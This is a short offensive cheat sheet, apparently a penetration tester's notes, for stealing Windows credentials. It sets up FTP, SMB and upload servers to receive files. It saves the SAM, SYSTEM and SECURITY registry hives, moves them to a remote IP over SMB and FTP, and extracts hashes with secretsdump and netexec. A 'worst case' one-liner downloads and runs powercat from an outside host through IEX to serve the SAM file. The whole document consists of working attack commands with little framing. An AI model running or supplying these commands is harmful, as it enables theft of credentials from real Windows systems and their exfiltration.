
### Receive
```shell
python -m pyftpdlib -p 21 --write

impacket-smbserver share share/ -smb2support

python3 -m uploadserver
```
### Windows
Dumping SAM
```powershell
reg.exe save HKLM\SAM C:\programdata\sam.bak
reg.exe save HKLM\SYSTEM C:\programdata\system.bak
reg.exe save HKLM\SECURITY C:\programdata\security.bak
```

```powershell
net use "\\192.168.171.121\adot8"
move sam.bak "\\192.168.171.121\adot8\sam.bak"
move system.bak "\\192.168.171.121\adot8\system.bak"
move security.bak "\\192.168.171.121\adot8\security.bak"
```

```powershell
echo open 192.168.45.237 21 > ftp.txt && echo user anonymous >> ftp.txt && echo anonymous >> ftp.txt && echo binary >> ftp.txt && echo put C:\programdata\sam.bak >> ftp.txt && echo put C:\programdata\system.bak >> ftp.txt && echo put C:\programdata\security.bak && echo bye >> ftp.txt
```

```shell
secretsdump.py -sam sam.bak -system system.bak -security security.bak local
```

Worst case
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.160.147:8888/powercat.ps1');powercat -l -p 6666 -i C:\windows.old\Windows\System32\SAM"
```

```shell
wget 10.10.160.148:6666/SAM
```

Remotely dumping
```bash
impacket-secretsdump Administrator:pass@10.0.0.2
```

```bash
netexec smb 10.129.42.198 --local-auth -u bob -p pass --lsa
netexec smb 10.129.42.198 --local-auth -u bob -p pass --sam
```